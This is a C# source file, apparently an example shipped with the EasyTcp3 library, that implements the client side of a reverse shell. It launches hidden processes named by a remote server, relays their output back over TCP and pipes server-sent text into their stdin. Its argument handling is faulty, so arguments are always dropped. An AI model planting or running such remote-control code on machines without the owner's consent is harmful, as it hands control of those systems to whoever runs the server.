using System;
using System.Diagnostics;
using System.Linq;
using EasyTcp3.Actions;
using EasyTcp3.ClientUtils;
using EasyTcp3.EasyTcpPacketUtils;

namespace EasyTcp3.Examples.ReverseShell.Client.Actions
{
    /// <summary>
    /// Class with actions for a remote shell 
    /// </summary>
    public class ShellActions
    {
        /// <summary>
        /// Running process
        /// </summary>
        private Process _process;

        /// <summary>
        /// Start a new process,
        /// old process gets disposed 
        /// </summary>
        [EasyTcpAction("execute")]
        public void Execute(Message e)
        {
            _process?.Dispose(); // Dispose old process if not null 
            var args = e.Decompress().ToString().Split(':');

            var startInfo = new ProcessStartInfo
            {
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                FileName = args[0],
                Arguments = !args.Any() ? string.Join(' ', args) : "",
                WindowStyle = ProcessWindowStyle.Hidden
            };

            _process = Process.Start(startInfo);
            _process.OutputDataReceived += (s, a) => e.Client.Send(a.Data);
            _process.BeginOutputReadLine();
            _process.ErrorDataReceived += (s, a) => e.Client.Send(a.Data);
            _process.BeginErrorReadLine();

            e.Client.Send("Created new process");
        }

        /// <summary>
        /// Pipe string into stdin of process 
        /// </summary>
        [EasyTcpAction(">")]
        public void PipeIntoProcess(Message e)
            => _process?.StandardInput.WriteLine(e.Decompress().ToString().Replace(':', ' '));
    }
}